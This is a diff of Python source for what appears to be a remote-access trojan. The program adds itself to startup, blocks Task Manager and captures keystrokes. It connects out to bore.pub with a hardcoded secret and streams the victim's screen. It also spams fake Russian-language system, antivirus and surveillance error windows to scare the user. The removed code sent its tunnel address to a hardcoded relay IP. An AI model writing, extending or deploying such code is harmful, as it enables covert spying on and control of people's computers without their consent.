@@ -1,204 +1,32 @@
 import socket
 import threading
-import zlib
-import numpy as np
-import cv2
 import pyautogui
 pyautogui.FAILSAFE = False
-import keyboard as kb
 from pynput.keyboard import Controller, Key
 import time
 import sys
 import os
 import psutil
 import subprocess
-import urllib.request
-import urllib.parse
-import shutil
-import queue
 import re
-import random
-import json
-import select
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
-class BoreClient:
-    def __init__(self, server_host, server_port, control_host='bore.pub', control_port=7835):
-        self.server_host = server_host
-        self.server_port = server_port
-        self.control_host = control_host
-        self.control_port = control_port
-        self.control_sock = None
-        self.running = False
-        self.public_port = None
-
-    def connect(self):
-        self.control_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.control_sock.settimeout(5)
-        self.control_sock.connect((self.control_host, self.control_port))
-        hello = json.dumps({"Hello": self.server_port}).encode() + b'\0'
-        self.control_sock.sendall(hello)
-        data = b''
-        while not data.endswith(b'\0'):
-            c = self.control_sock.recv(1)
-            if not c:
-                raise ConnectionError("bore server disconnected")
-            data += c
-        response = json.loads(data[:-1].decode())
-        if "Hello" in response:
-            self.public_port = response["Hello"]
-            return f"bore.pub:{self.public_port}"
-        elif "Error" in response:
-            raise ConnectionError(f"bore error: {response['Error']}")
-        raise ConnectionError(f"unexpected response: {response}")
-
-    def listen(self):
-        self.running = True
-        buf = b''
-        while self.running:
-            try:
-                chunk = self.control_sock.recv(4096)
-                if not chunk:
-                    break
-                buf += chunk
-                while b'\0' in buf:
-                    msg, buf = buf.split(b'\0', 1)
-                    try:
-                        d = json.loads(msg.decode())
-                        if "Connection" in d:
-                            threading.Thread(target=self.handle_connection, args=(d["Connection"],), daemon=True).start()
-                    except:
-                        pass
-            except socket.timeout:
-                continue
-            except:
-                break
-
-    def handle_connection(self, conn_id):
-        try:
-            remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            remote.settimeout(5)
-            remote.connect((self.control_host, self.control_port))
-            remote.sendall(json.dumps({"Accept": conn_id}).encode() + b'\0')
-            local = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            local.settimeout(5)
-            local.connect((self.server_host, self.server_port))
-            socks = [remote, local]
-            while self.running:
-                r, _, _ = select.select(socks, [], [], 1.0)
-                if not r:
-                    continue
-                for s in r:
-                    data = s.recv(4096)
-                    if not data:
-                        return
-                    if s is remote:
-                        local.sendall(data)
-                    else:
-                        remote.sendall(data)
-        except:
-            pass
-        finally:
-            for s in (remote, local):
-                try:
-                    s.close()
-                except:
-                    pass
-
-    def close(self):
-        self.running = False
-        if self.control_sock:
-            try:
-                self.control_sock.close()
-            except:
-                pass
+SECRET = "gH7#kL9$mN2@pQ5!rT8&vB4*wZ1"
 
 class RemoteControlServer:
-    def __init__(self, host='0.0.0.0', port=65432):
-        self.host = host
-        self.port = port
-        self.server_socket = None
-        self.client_socket = None
+    def __init__(self):
         self.running = False
         self.reverse_mouse = False
         self.keyboard_controller = Controller()
         self.keyboard_capture_active = False
         self.block_taskmgr = False
-        self.bore_url = None
-        self.bore_client = None
         self.locked = False
         self.lock_window = None
         self.autoclick_active = False
         self.automove_active = False
         self._kb_hook = None
-
-    RELAY_HOST = "0.0.0.0"
-    RELAY_PORT = 1234
-
-    def share_url_via_relay(self):
-        while self.running:
-            url = self.bore_url
-            for host in [self.RELAY_HOST, "31.77.56.70"]:
-                try:
-                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    s.settimeout(10)
-                    s.connect((host, self.RELAY_PORT))
-                    s.sendall(f"PUT {url or 'NONE'}\n".encode())
-                    s.close()
-                    if url:
-                        print(f"Sent to relay: {url}")
-                    break
-                except:
-                    continue
-            time.sleep(2)
-
-    def broadcast_url(self):
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
-        while self.running:
-            url = self.bore_url
-            if not url:
-                time.sleep(1)
-                continue
-            try:
-                sock.sendto(url.encode(), ('255.255.255.255', 45631))
-            except:
-                pass
-            time.sleep(1)
-
-    def run_bore_exe(self):
-        for p in [shutil.which("bore.exe"), "bore.exe"]:
-            if p and os.path.exists(p):
-                return os.path.abspath(p)
-        meipass = getattr(sys, '_MEIPASS', None)
-        if meipass:
-            p = os.path.join(meipass, "bore.exe")
-            if os.path.exists(p):
-                return p
-        return None
-
-    def run_bore_python(self):
-        print("Connecting to bore.pub (Python client)...")
-        try:
-            self.bore_client = BoreClient('127.0.0.1', self.port)
-            url = self.bore_client.connect()
-            self.bore_url = url
-            print(f"\nRemote access URL: {self.bore_url}")
-            threading.Thread(target=self.bore_client.listen, daemon=True).start()
-            return True
-        except Exception as e:
-            print(f"bore.pub connection failed: {e}")
-            return False
-
-    def start_tunnel(self):
-        threading.Thread(target=self.share_url_via_relay, daemon=True).start()
-        threading.Thread(target=self.broadcast_url, daemon=True).start()
-        threading.Thread(target=self.run_bore_python, daemon=True).start()
-        return True
-
-    def stop_tunnel(self):
-        if self.bore_client:
-            self.bore_client.close()
-        self.bore_client = None
+        self.error_spam_running = False
+        self.error_spam_root = None
 
     def hide_console(self):
         try:
@@ -219,61 +47,59 @@ class RemoteControlServer:
             pass
 
     def start(self):
-        self.hide_console()
         self.add_to_startup()
-        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        self.server_socket.bind((self.host, self.port))
-        self.server_socket.listen(1)
         self.running = True
 
-        self.start_tunnel()
+        threading.Thread(target=self.monitor_task_manager, daemon=True).start()
 
-        # Запуск фонового мониторинга Диспетчера задач
-        taskmgr_thread = threading.Thread(
-            target=self.monitor_task_manager,
-            daemon=True
-        )
-        taskmgr_thread.start()
+        while self.running:
+            conn = self.find_bore_port()
+            if conn:
+                threading.Thread(target=self.stream_screens, args=(conn,), daemon=True).start()
+                self.handle_client(conn)
+            time.sleep(10)
 
-        print(f"Server started on {self.host}:{self.port}. Waiting for connections...")
+    def find_bore_port(self):
+        def try_port(p):
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(0.3)
+            try:
+                s.connect(('bore.pub', p))
+                s.sendall(f"AUTH {SECRET}\n".encode())
+                s.settimeout(5)
+                resp = s.recv(1024)
+                if resp.strip() == b"AUTH_OK":
+                    s.settimeout(None)
+                    return s
+            except: pass
+            s.close()
+            return None
 
-        try:
-            while self.running:
-                self.client_socket, addr = self.server_socket.accept()
-                print(f"Connected by {addr}")
-
-                client_thread = threading.Thread(
-                    target=self.handle_client,
-                    args=(self.client_socket,),
-                    daemon=True
-                )
-                client_thread.start()
-
-        except KeyboardInterrupt:
-            print("\nShutting down server...")
-        finally:
-            self.stop()
+        with ThreadPoolExecutor(max_workers=20) as ex:
+            futs = [ex.submit(try_port, p) for p in range(65535, 64999, -1)]
+            for f in as_completed(futs):
+                r = f.result()
+                if r:
+                    return r
+        return None
 
     def stop(self):
         self.running = False
-        self.stop_tunnel()
-        if self.client_socket:
-            self.client_socket.close()
-        if self.server_socket:
-            self.server_socket.close()
-        print("Server stopped")
 
     def stream_screens(self, client_socket):
-        import mss
-        with mss.mss() as sct:
-            while self.running:
-                try:
-                    img = cv2.cvtColor(np.array(sct.grab(sct.monitors[0])), cv2.COLOR_BGRA2BGR)
-                    _, enc = cv2.imencode('.jpg', img, [cv2.IMWRITE_JPEG_QUALITY, 40])
-                    client_socket.sendall(len(enc).to_bytes(4, 'big') + enc.tobytes())
-                except:
-                    break
+        from PIL import Image
+        import io
+        while self.running:
+            try:
+                img = pyautogui.screenshot()
+                img = img.resize((1280, 720), Image.LANCZOS)
+                buf = io.BytesIO()
+                img.save(buf, format='JPEG', quality=25, optimize=True)
+                data = buf.getvalue()
+                client_socket.sendall(len(data).to_bytes(4, 'big') + data)
+                time.sleep(0.05)
+            except:
+                break
 
     def handle_client(self, client_socket):
         threading.Thread(target=self.stream_screens, args=(client_socket,), daemon=True).start()
@@ -328,6 +154,12 @@ class RemoteControlServer:
 
             elif cmd == "fake_error":
                 self.bg(self.show_fake_error)
+
+            elif cmd == "error_spam":
+                self.bg(self.run_error_spam)
+
+            elif cmd == "error_spam_stop":
+                self.stop_error_spam()
 
             elif cmd == "reverse_mouse":
                 self.reverse_mouse = not self.reverse_mouse
@@ -525,13 +357,14 @@ class RemoteControlServer:
 
     def send_screenshot(self):
         try:
+            from PIL import Image
+            import io, zlib
             img = pyautogui.screenshot()
-            img = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
-            _, img_encoded = cv2.imencode('.jpg', img, [cv2.IMWRITE_JPEG_QUALITY, 70])
-            compressed = zlib.compress(img_encoded.tobytes())
+            buf = io.BytesIO()
+            img.save(buf, format='JPEG', quality=70, optimize=True)
+            compressed = zlib.compress(buf.getvalue())
             size = len(compressed)
-            size_bytes = size.to_bytes(4, 'big')
-            return size_bytes + compressed
+            return size.to_bytes(4, 'big') + compressed
         except Exception as e:
             print(f"Error sending screenshot: {e}")
             return "Error"
@@ -585,14 +418,83 @@ class RemoteControlServer:
         except:
             pass
 
+    def run_error_spam(self):
+        if self.error_spam_running:
+            return
+        self.error_spam_running = True
+        try:
+            import tkinter as tk, time, random, ctypes
+            ERRORS = [
+                ("Ошибка системы", "Обнаружено нарушение целостности системных файлов.\nSTOP CODE: CRITICAL_PROCESS_DIED"),
+                ("Сбой приложения", "explorer.exe перестал работать.\nWindows собирает сведения об ошибке..."),
+                ("Предупреждение безопасности", "Обнаружен нежелательный доступ к реестру.\nИсточник: UNKNOWN_PROCESS.exe"),
+                ("Нехватка памяти", "Недостаточно памяти для завершения операции.\nДоступно: 0 МБ"),
+                ("Ошибка активации Windows", "Оставшееся время: 3 дня."),
+                ("Антивирус — Угроза найдена", "Обнаружен вирус!\nФАЙЛ: downloads\\crack.exe\nУГРОЗА: Trojan.Win32.Generic"),
+                ("Перегрев процессора", "Температура CPU достигла 103°C!"),
+                ("Обнаружена слежка", "Программа запросила доступ к камере.\nПРОЦЕСС: svchost.exe"),
+                ("Ошибка драйвера", "Драйвер NVIDIA застрял в бесконечном цикле.\nDRIVER_IRQL_NOT_LESS_OR_EQUAL"),
+                ("КРИТИЧЕСКАЯ ОШИБКА", "Все несохранённые данные будут потеряны.\nERROR: 0xDEADBEEF"),
+            ]
+            def make_err(title, text):
+                win = tk.Toplevel(root)
+                win.title(title)
+                win.resizable(False, False)
+                win.configure(bg='#f0f0f0')
+                win.attributes('-topmost', True)
+                tk.Frame(win, bg='#c42b1c', height=4).pack(fill='x')
+                body = tk.Frame(win, bg='#f0f0f0', padx=20, pady=14)
+                body.pack(fill='both', expand=True)
+                row = tk.Frame(body, bg='#f0f0f0')
+                row.pack(fill='x', pady=(0, 12))
+                tk.Label(row, text='🛑', font=('Segoe UI Emoji', 28), bg='#f0f0f0').pack(side='left', padx=(0, 14))
+                info = tk.Frame(row, bg='#f0f0f0')
+                info.pack(side='left', fill='x', expand=True)
+                tk.Label(info, text=title, font=('Segoe UI', 10, 'bold'), bg='#f0f0f0', fg='#c42b1c', wraplength=300, anchor='w').pack(fill='x')
+                tk.Label(info, text=text, font=('Segoe UI', 9), bg='#f0f0f0', fg='#1a1a1a', wraplength=300, justify='left').pack(fill='x', pady=(4, 0))
+                tk.Frame(body, bg='#d0d0d0', height=1).pack(fill='x', pady=(8, 8))
+                btnr = tk.Frame(body, bg='#f0f0f0')
+                btnr.pack(anchor='e')
+                tk.Button(btnr, text='OK', font=('Segoe UI', 9), width=12, bg='#0078d4', fg='white', relief='flat', command=win.destroy).pack(side='left', padx=4)
+                win.update_idletasks()
+                sw, sh = root.winfo_screenwidth(), root.winfo_screenheight()
+                win.geometry(f'+{random.randint(30, max(31, sw - win.winfo_reqwidth() - 30))}+{random.randint(30, max(31, sh - win.winfo_reqheight() - 60))}')
+                try:
+                    hwnd = int(win.wm_frame(), 16)
+                    ctypes.windll.user32.SetWindowPos(hwnd, -1, 0, 0, 0, 0, 0x0002 | 0x0001)
+                    ctypes.windll.user32.SetForegroundWindow(hwnd)
+                except: pass
+            def spam():
+                if not self.error_spam_running:
+                    root.quit(); return
+                make_err(*random.choice(ERRORS))
+                root.after(random.randint(5000, 15000), spam)
+            root = tk.Tk()
+            root.withdraw()
+            self.error_spam_root = root
+            root.after(1000, spam)
+            root.mainloop()
+        except: pass
+        finally:
+            self.error_spam_running = False
+            self.error_spam_root = None
+
+    def stop_error_spam(self):
+        self.error_spam_running = False
+        if self.error_spam_root:
+            try:
+                self.error_spam_root.quit()
+                self.error_spam_root.destroy()
+            except: pass
+            self.error_spam_root = None
+
 if __name__ == "__main__":
     try:
-        import keyboard
         from pynput.keyboard import Controller
         import psutil
     except ImportError as e:
         print(f"Error: Required library not found - {e}")
-        print("Please install with: pip install pyautogui keyboard pynput psutil")
+        print("Please install with: pip install pyautogui pynput psutil")
         sys.exit(1)
 
     server = RemoteControlServer()
